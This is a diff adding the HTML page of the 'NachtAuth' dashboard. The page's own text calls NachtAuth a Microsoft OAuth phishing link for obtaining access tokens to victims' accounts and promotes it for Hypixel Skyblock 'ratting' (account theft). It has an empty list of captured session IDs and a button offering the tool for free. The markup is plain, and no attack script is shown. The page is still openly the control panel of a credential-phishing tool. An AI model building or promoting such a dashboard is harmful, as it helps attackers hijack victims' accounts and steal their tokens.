@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>NachtAuth Dashboard</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="animation.css">
+    <link rel="icon" href="img/NachtAuth.png">
+</head>
+<body>
+    <div id="navbar" class="navbar">
+        <!-- Add the title -->
+        <h1 id="navbar-title" class="navbar-title"><img alt="NachtAuth" src="img/NachtAuth.png"></h1>
+        <!-- Add the minimize button -->
+        <div id="navbar-minimize" class="navbar-minimize" onclick="toggleNavbar()">&times;</div>
+        <!-- Add the options -->
+        <div id="navbar-option1" class="navbar-option" onclick="showScreen('screen-1')">Session IDs</div>
+        <div id="navbar-option4" class="navbar-option" onclick="showScreen('screen-4')">Get NachtAuth</div>
+      </div>
+
+    <div id="screen-1" class="screen">
+        <h1 class="title-text">Session IDs</h1>
+        <div class="list" id="list">
+            
+          </div>
+    </div>
+    <div id="screen-4" class="screen">
+        <h1 class="title-text">Get NachtAuth</h1>
+        <h3 class="nachtauth-question">What is NachtAuth?</h3>
+        <p class="nachtauth-description">NachtAuth is a Microsoft oAuth Phishing link used to get an access token to your victim's account. Paired with the NachtAuth dashboard, Hypixel Skyblock ratting has never been easier.</p>
+        <button class="download-nachtauth-button" onclick="VisitGithub()">Get NachtAuth for Free <img class="nachtauth-button-image" src="img/NachtAuth.png"></button>
+    </div>
+<script src="script.js"></script> 
+</body>
+</html>
